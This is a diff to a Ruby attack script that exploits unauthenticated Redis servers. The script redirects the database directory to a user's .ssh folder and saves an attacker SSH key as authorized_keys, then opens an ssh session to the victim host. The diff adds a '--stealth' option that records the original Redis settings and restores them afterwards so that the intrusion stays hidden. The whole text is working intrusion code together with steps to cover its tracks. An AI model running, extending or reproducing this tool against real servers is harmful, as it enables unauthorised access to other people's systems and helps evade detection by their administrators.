@@ -40,7 +40,7 @@ OptionParser.new do |parser|
 	parser.on("-u", "--user USER", "Force specific user") do |u|
 		@opts[:user] = u
 	end
-	parser.on("-d", "--dir DIR", "Force specific directory") do |d|
+	parser.on("-d", "--dir DIR", "Force specific .ssh directory") do |d|
 		@opts[:dir] = d
 	end
 	parser.on("-s", "--sshport PORT", "Port to ssh to (default: 22)") do |s|
@@ -51,6 +51,9 @@ OptionParser.new do |parser|
 	end
 	parser.on("-i", "--info", "Print info about a redis server") do |i|
 		@opts[:info] = i
+	end
+	parser.on("-e", "--stealth", "Restore configuration to stay hidden") do |e|
+		@opts[:stealth] = e
 	end
 	parser.on(nil, "--help", "Print this help") do
         puts parser
@@ -64,8 +67,12 @@ if !@opts[:host]
 end
 
 #For exit and log oneliners
+@changedConfigDir = @changedConfigFile = false
 def error
 	yield
+	if @changedConfigDir or @changedConfigFile
+		Log.warn "Permanent changes to the servers configuration have been made, these will have to be undone to stay hidden"
+	end
 	exit 1
 end
 
@@ -220,9 +227,9 @@ out = send "config get dir"
 Log.res out if @opts[:verbose]
 Log.warn "Unable to read config dir" if !out.start_with?("*2\r\n$3\r\ndir\r\n")
 
-dir = out.split("\r\n")[4]
-Log.info "Config directory: #{dir}"
-sdir dir
+@conf_dir = out.split("\r\n")[4]
+Log.info "Config directory: #{@conf_dir}"
+sdir @conf_dir
 
 if @opts[:check]
 	if @vuln
@@ -249,11 +256,23 @@ Log.info "Setting configuration directory"
 out = send "config set dir #{@opts[:dir]}"
 Log.res out if @opts[:verbose]
 error {Log.err "Failed to change config directory to .ssh (might not exist)"} if out != "+OK\r\n"
+@changedConfigDir = true
+
+if @opts[:stealth]
+	# Config directory retrieval
+	Log.info "Getting original database filename"
+	out = send "config get dbfilename"
+	Log.res out if @opts[:verbose]
+	Log.warn "Unable to read database filename" if !out.start_with?("*2\r\n$10\r\ndbfilename\r\n")
+
+	@conf_dbfilename = out.split("\r\n")[4]
+end
 
 Log.info "Change database file to authorized_keys"
 out = send "config set dbfilename authorized_keys"
 Log.res out if @opts[:verbose]
 error {Log.err "Failed to change config database filename"} if out != "+OK\r\n"
+@changedConfigFile = true
 
 =begin # Checking if we can set a key
 Log.info "Checking if we can set a key"
@@ -293,6 +312,24 @@ error {Log.err "Failed to save database"} if out != "+OK\r\n"
 
 # Save user for later runs
 File.write "#{host_dir}/user", @opts[:user]
+
+if !@opts[:stealth]
+	Log.warn "Not using -e flag, so not cleaning up"
+else
+	if @conf_dir
+		Log.info "Restoring configuration directory"
+		out = send "config set dir #{@conf_dir}"
+		Log.res out if @opts[:verbose]
+		Log.warn "Failed to change config directory back" if out != "+OK\r\n"
+	end
+
+	if @conf_dbfilename
+		Log.info "Restoring databasefile"
+		out = send "config set dbfilename #{@conf_dbfilename}"
+		Log.res out if @opts[:verbose]
+		Log.warn "Failed to restore config database filename" if out != "+OK\r\n"
+	end
+end
 
 Log.info "Running ssh"
 exec "ssh -i #{host_dir}/id_rsa #{@opts[:user]}@#{@opts[:host]} -p #{@opts[:sshport]}"
